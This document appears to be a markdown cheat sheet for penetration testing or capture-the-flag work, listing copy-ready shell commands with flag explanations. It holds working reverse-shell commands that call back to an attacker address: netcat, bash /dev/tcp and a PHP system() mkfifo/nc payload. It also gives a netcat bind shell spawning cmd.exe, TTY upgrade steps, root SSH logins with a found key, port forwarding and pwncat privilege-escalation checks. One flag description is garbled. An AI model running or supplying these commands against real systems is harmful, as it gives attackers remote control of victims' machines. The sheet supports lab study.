# Shell & Networking Commands

## Reverse Shell

### Attacker
```bash copy
sudo nc -lvnp 1234
```
- Listens for incoming reverse shell connection from victim.
- `-l`: Listen mode
- `-v`: Verb table="false"ose output
- `-n`: No DNS resolution
- `-p 1234`: Port 1234

### Victim
```bash copy
nc 10.10.10.10 1234 -e /bin/bash
```
- Connects to attacker and spawns a bash shell.
- `-e /bin/bash`: Executes bash on connection

### Victim version 2 with bash use

```bash copy
bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
```

- **Description**: Creates an interactive bash reverse shell connecting to the attacker's machine.
- `-i`: Runs bash in interactive mode
- `>& /dev/tcp/10.10.10.10/1234`: Redirects stdout and stderr to TCP connection
- `0>&1`: Redirects stdin to the same TCP connection

### Victim php
``` php copy
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.233 1234 >/tmp/f"); ?>
```

## Bind Shell

### Victim
```bash copy
nc -lvnp 1234 -e "cmd.exe"
```
- Listens for incoming connection and spawns cmd.exe.
- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: No DNS resolution
- `-p 1234`: Port 1234
- `-e "cmd.exe"`: Executes cmd.exe

### Attacker
```bash copy
nc 10.10.10.10 1234
```
- Connects to victim’s bind shell on specified port.
- No switches

## Shell Enhancement

```bash copy
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- Spawns an interactive bash shell with proper terminal.
- No switches

```bash copy
export TERM=xterm
```
- Sets terminal type for better compatibility.
- No switches


**Note**: Now press Ctrl + Z before next step
```bash copy
stty raw -echo; fg
```
- Restores interactive shell after Ctrl+Z.
- `raw`: Raw terminal mode
- `-echo`: Disables echo
- `fg`: Brings session to foreground

## SSH

```bash copy
ssh -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.10
```
- Connects to target via SSH with legacy RSA support.
- `-oHostKeyAlgorithms=+ssh-rsa`: Enables legacy RSA key algorithms

```bash copy
ls -la /.ssh
```
- Lists SSH key files in the .ssh directory.
- `-la`: Detailed list with hidden files

```bash copy
chmod 600 root_key
```
- Sets secure permissions for SSH key file.
- `600`: Read/write for owner only

```bash copy
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.10
```
- Connects via SSH using specific key and legacy RSA.
- `-i root_key`: Specifies key file
- `-oPubkeyAcceptedKeyTypes=+ssh-rsa`: Allows RSA public keys
- `-oHostKeyAlgorithms=+ssh-rsa`: Enables legacy RSA algorithms

## SSH Tunneling

```bash copy
ssh -L 7777:10.10.10.10:1234 aubreanna@10.10.10.10
```
- Forwards local port 7777 to target’s port 1234.
- `-L 7777:10.10.10.10:1234`: Local port forwarding


## Pwncat

```bash copy
pwncat -l 4444
```
- Listens for pwncat connection on port 4444.
- `-l 4444`: Listen on port 4444

```bash copy
privesc -l
```
- Lists privilege escalation options with pwncat.
- `-l`: Lists available checks

## More
- **Here**: [PentestMonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)